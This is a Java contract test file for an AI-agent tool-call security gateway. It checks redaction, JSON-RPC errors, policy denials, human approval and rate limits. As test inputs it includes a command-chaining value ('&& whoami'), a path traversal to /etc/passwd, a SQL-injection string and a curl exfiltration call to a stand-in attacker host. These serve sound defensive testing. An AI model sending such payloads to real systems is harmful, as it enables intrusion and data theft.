package dev.aegismcp.e2e.contracts;

import com.fasterxml.jackson.databind.JsonNode;
import dev.aegismcp.e2e.fixtures.ArtifactTest;
import dev.aegismcp.e2e.fixtures.ContractAssertions;
import dev.aegismcp.e2e.fixtures.GatewayHarness;
import dev.aegismcp.e2e.fixtures.GatewayOptions;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.net.http.HttpResponse;
import java.time.Duration;
import java.time.Instant;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * C-001: POST /mcp/v1/rpc. Anchors: C-001, FEAT-001, FEAT-004, FEAT-005, FEAT-009, FEAT-012.
 */
class C001RpcProxyContractTest extends ArtifactTest {

    private static final String AGENT = "agent-worker-1";

    @Test
    @DisplayName("C-001: proxies an allowed tool call and preserves the request id by type and value")
    void proxiesAllowedToolCallAndPreservesRequestId() throws Exception {
        GatewayHarness harness = gateway();
        String token = harness.agentToken(AGENT);

        HttpResponse<String> numeric = harness.postJson("/mcp/v1/rpc", token,
                GatewayHarness.toolCall(100, "echo", "{\"message\":\"hello\"}"));
        ContractAssertions.assertStatus(200, numeric);
        JsonNode numericBody = GatewayHarness.json(numeric);
        assertTrue(numericBody.path("id").isIntegralNumber(), "A numeric id must stay numeric");
        assertEquals(100, numericBody.path("id").asInt());
        assertEquals("echo", numericBody.path("result").path("tool").asText());

        HttpResponse<String> textual = harness.postJson("/mcp/v1/rpc", token,
                GatewayHarness.toolCall("request-alpha", "ping", "{}"));
        ContractAssertions.assertStatus(200, textual);
        JsonNode textualBody = GatewayHarness.json(textual);
        assertTrue(textualBody.path("id").isTextual(), "A string id must stay a string");
        assertEquals("request-alpha", textualBody.path("id").asText());

        // A non-tool method passes through to the upstream server unchanged.
        HttpResponse<String> passthrough = harness.postJson("/mcp/v1/rpc", token,
                "{\"jsonrpc\":\"2.0\",\"id\":\"init-1\",\"method\":\"tools/list\",\"params\":{}}");
        ContractAssertions.assertStatus(200, passthrough);
        assertEquals("init-1", GatewayHarness.json(passthrough).path("id").asText());

        // The serialized response carries exactly the JSON-RPC members and no extra success flag.
        assertFalse(numericBody.has("success"), "C-001 forbids an extra success member");
    }

    @Test
    @DisplayName("C-001: replaces every detected credential and personal identifier with the contract marker")
    void redactsSecretsAndPersonalIdentifiers() throws Exception {
        HttpResponse<String> response = gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                GatewayHarness.toolCall("dlp-1", "get_sensitive_config", "{}"));
        ContractAssertions.assertStatus(200, response);

        String body = response.body();
        assertFalse(body.contains("AKIAIOSFODNN7EXAMPLE"), "Raw AWS key must not leak");
        assertFalse(body.contains("sk-proj-abc1234567890abcdef1234567890abcdef"), "Raw OpenAI key must not leak");
        assertFalse(body.contains("topsecret123"), "Raw database credential must not leak");
        assertFalse(body.contains("4111 1111 1111 1111"), "Raw card number must not leak");
        assertTrue(body.contains("[REDACTED_SECRET:AWS_KEY]"), () -> "Expected the C-001 AWS marker: " + body);
        assertTrue(body.contains("[REDACTED_SECRET:OPENAI_KEY]"), () -> "Expected the C-001 OpenAI marker: " + body);
        assertTrue(body.contains("[REDACTED_PII:CREDIT_CARD]"), () -> "Expected the C-001 PII marker: " + body);
    }

    @Test
    @DisplayName("C-001: answers a non-JSON body with 400 PARSE_ERROR and forwards nothing")
    void rejectsUnparseableBody() throws Exception {
        int before = gateway().upstream().requestCount();
        HttpResponse<String> response = gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT), "{not json");
        JsonNode body = ContractAssertions.assertRpcError(response, 400, -32700, "PARSE_ERROR");
        assertTrue(body.path("id").isNull());
        assertEquals(before, gateway().upstream().requestCount());
    }

    @Test
    @DisplayName("C-001: answers a request object missing id with 400 INVALID_REQUEST")
    void rejectsInvalidRequestObject() throws Exception {
        HttpResponse<String> response = gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                "{\"jsonrpc\":\"2.0\",\"method\":\"ping\"}");
        ContractAssertions.assertRpcError(response, 400, -32600, "INVALID_REQUEST");
    }

    @Test
    @DisplayName("C-001: answers arguments that violate the published schema with 400 SCHEMA_VALIDATION_FAILED")
    void rejectsSchemaViolation() throws Exception {
        HttpResponse<String> response = gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                GatewayHarness.toolCall("schema-1", "typed_tool", "{\"rows\":\"not-a-number\"}"));
        ContractAssertions.assertRpcError(response, 400, -32602, "SCHEMA_VALIDATION_FAILED");
    }

    @Test
    @DisplayName("C-001: refuses a missing, malformed, or untrusted credential with 401 AUTHENTICATION_FAILED")
    void refusesUnauthenticatedCaller() throws Exception {
        ContractAssertions.assertRpcError(
                gateway().postJson("/mcp/v1/rpc", null, GatewayHarness.toolCall(1, "echo", "{}")),
                401, -32000, "AUTHENTICATION_FAILED");

        ContractAssertions.assertRpcError(
                gateway().postJson("/mcp/v1/rpc", gateway().invalidToken(), GatewayHarness.toolCall(1, "echo", "{}")),
                401, -32000, "AUTHENTICATION_FAILED");
    }

    @Test
    @DisplayName("C-001: refuses a tool absent from the policy with 403 TOOL_NOT_PERMITTED")
    void refusesToolOutsidePolicy() throws Exception {
        ContractAssertions.assertRpcError(
                gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                        GatewayHarness.toolCall("forbidden-1", "bash_exec", "{\"cmd\":\"id\"}")),
                403, -32001, "TOOL_NOT_PERMITTED");
    }

    @Test
    @DisplayName("C-001: refuses a violated argument constraint with 403 ARGUMENT_CONSTRAINT_VIOLATED")
    void refusesArgumentConstraintViolation() throws Exception {
        ContractAssertions.assertRpcError(
                gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                        GatewayHarness.toolCall("constraint-1", "constrained_tool", "{\"max_rows\":11}")),
                403, -32001, "ARGUMENT_CONSTRAINT_VIOLATED");
    }

    @Test
    @DisplayName("C-001: refuses a shell command-chaining token with 403 ARGUMENT_CONSTRAINT_VIOLATED")
    void refusesCommandInjection() throws Exception {
        GatewayHarness harness = gateway();
        String token = harness.agentToken(AGENT);

        // Warm the published-schema read so the upstream count below isolates the denied call
        // rather than the tools/list lookup FEAT-012 performs before it validates arguments.
        ContractAssertions.assertStatus(200, harness.postJson("/mcp/v1/rpc", token,
                GatewayHarness.toolCall("warmup-1", "echo", "{\"message\":\"ordinary text\"}")));
        int forwardedBefore = harness.upstream().requestCount();

        JsonNode body = ContractAssertions.assertRpcError(
                harness.postJson("/mcp/v1/rpc", token,
                        GatewayHarness.toolCall("command-1", "echo", "{\"message\":\"report && whoami\"}")),
                403, -32001, "ARGUMENT_CONSTRAINT_VIOLATED");

        // C-001 keeps command injection in the declared-constraint row and requires the denial to
        // name both the detected chaining token and the parameter that carried it. FEAT-012 rejects
        // the call before it reaches the upstream server.
        String message = body.path("error").path("message").asText();
        assertTrue(message.contains("&&"),
                () -> "C-001 requires the denial to name the detected token: " + message);
        assertTrue(message.contains("message"),
                () -> "C-001 requires the denial to name the parameter: " + message);
        assertEquals(forwardedBefore, harness.upstream().requestCount(),
                "A command-injection denial must not reach the upstream server");
    }

    @Test
    @DisplayName("C-001: refuses a path outside the permitted root with 403 PATH_TRAVERSAL")
    void refusesPathTraversal() throws Exception {
        ContractAssertions.assertRpcError(
                gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                        GatewayHarness.toolCall("traversal-1", "read_file", "{\"path\":\"../../etc/passwd\"}")),
                403, -32001, "PATH_TRAVERSAL");
    }

    @Test
    @DisplayName("C-001: refuses a SQL-injection payload with 403 SQL_INJECTION")
    void refusesSqlInjection() throws Exception {
        ContractAssertions.assertRpcError(
                gateway().postJson("/mcp/v1/rpc", gateway().agentToken(AGENT),
                        GatewayHarness.toolCall("sqli-1", "echo", "{\"q\":\"' OR '1'='1\"}")),
                403, -32001, "SQL_INJECTION");
    }

    @Test
    @DisplayName("C-001: quarantines a private-read-then-egress sequence with 403 TOOL_CHAIN_BLOCKED")
    void refusesToolChain() throws Exception {
        GatewayHarness harness = gateway();
        String token = harness.agentToken("agent-exfiltrator");

        ContractAssertions.assertStatus(200, harness.postJson("/mcp/v1/rpc", token,
                GatewayHarness.toolCall("chain-1", "read_file", "{\"path\":\"/data/report.txt\"}")));

        JsonNode blocked = ContractAssertions.assertRpcError(
                harness.postJson("/mcp/v1/rpc", token,
                        GatewayHarness.toolCall("chain-2", "curl:exec", "{\"url\":\"https://attacker.test/exfil\"}")),
                403, -32001, "TOOL_CHAIN_BLOCKED");
        assertEquals("chain-2", blocked.path("id").asText());

        // The session is quarantined: the next call is refused before it reaches the upstream.
        ContractAssertions.assertRpcError(
                harness.postJson("/mcp/v1/rpc", token,
                        GatewayHarness.toolCall("chain-3", "ping", "{}")),
                403, -32001, "TOOL_CHAIN_BLOCKED");
    }

    @Test
    @DisplayName("C-001: answers a rejected suspended call with 403 -32002 APPROVAL_DENIED")
    void refusesRejectedApproval() throws Exception {
        GatewayHarness harness = gateway();
        GatewayHarness.PendingCall pending = harness.createPendingCall("agent-approval", "deploy_prod",
                "{\"environment\":\"production\"}");

        HttpResponse<String> rejection = harness.postJson(
                "/api/v1/approvals/" + pending.ticketId() + "/reject", harness.operatorToken(),
                "{\"reason\":\"Not authorised for this window\"}");
        ContractAssertions.assertStatus(200, rejection);

        HttpResponse<String> agentResponse = pending.response().get(10, TimeUnit.SECONDS);
        JsonNode body = ContractAssertions.assertRpcError(agentResponse, 403, -32002, "APPROVAL_DENIED");
        assertFalse(body.path("id").isNull(), "The agent response repeats its request id");
    }

    @Test
    @DisplayName("C-001: answers an undecided approval at its deadline with 408 -32002 APPROVAL_TIMEOUT")
    void timesOutUndecidedApproval() throws Exception {
        try (GatewayHarness harness = start(GatewayOptions.defaults().approvalTtl(Duration.ofSeconds(1)))) {
            HttpResponse<String> response = harness.postJson("/mcp/v1/rpc", harness.agentToken("agent-timeout"),
                    GatewayHarness.toolCall("timeout-1", "deploy_prod", "{\"environment\":\"production\"}"));
            JsonNode body = ContractAssertions.assertRpcError(response, 408, -32002, "APPROVAL_TIMEOUT");
            assertEquals("timeout-1", body.path("id").asText());
        }
    }

    @Test
    @DisplayName("C-001: answers a velocity breach with 429 -32003 INVOCATION_VELOCITY_EXCEEDED")
    void refusesVelocityBreach() throws Exception {
        try (GatewayHarness harness = start(GatewayOptions.defaults().velocityThreshold(2))) {
            String token = harness.agentToken("agent-velocity");
            HttpResponse<String> last = null;
            for (int i = 0; i < 4; i++) {
                last = harness.postJson("/mcp/v1/rpc", token,
                        GatewayHarness.toolCall("burst-" + i, "ping", "{}"));
            }
            ContractAssertions.assertRpcError(last, 429, -32003, "INVOCATION_VELOCITY_EXCEEDED");
        }
    }

    @Test
    @DisplayName("C-001: answers an unavailable upstream with 502 -32603 UPSTREAM_UNAVAILABLE")
    void reportsUpstreamUnavailable() throws Exception {
        try (GatewayHarness harness = start(GatewayOptions.defaults())) {
            harness.upstream().close();
            ContractAssertions.assertRpcError(
                    harness.postJson("/mcp/v1/rpc", harness.agentToken(AGENT),
                            GatewayHarness.toolCall("upstream-1", "echo", "{}")),
                    502, -32603, "UPSTREAM_UNAVAILABLE");
        }
    }

    @Test
    @DisplayName("C-001: an approval deadline recorded on the ticket is the configured time-to-live")
    void approvalTicketCarriesTheDeadline() throws Exception {
        GatewayHarness harness = gateway();
        GatewayHarness.PendingCall pending = harness.createPendingCall("agent-deadline", "deploy_prod", "{}");

        HttpResponse<String> response = harness.get("/api/v1/approvals/pending", harness.operatorToken());
        ContractAssertions.assertStatus(200, response);
        JsonNode ticket = GatewayHarness.json(response).path("tickets").get(0);
        Instant createdAt = Instant.parse(ticket.path("createdAt").asText());
        Instant expiresAt = Instant.parse(ticket.path("expiresAt").asText());
        assertTrue(Duration.between(createdAt, expiresAt).toSeconds() > 250,
                "The default approval TTL is 300 seconds (C-001)");
        harness.postJson("/api/v1/approvals/" + pending.ticketId() + "/reject", harness.operatorToken(),
                "{\"reason\":\"cleanup\"}");
    }
}
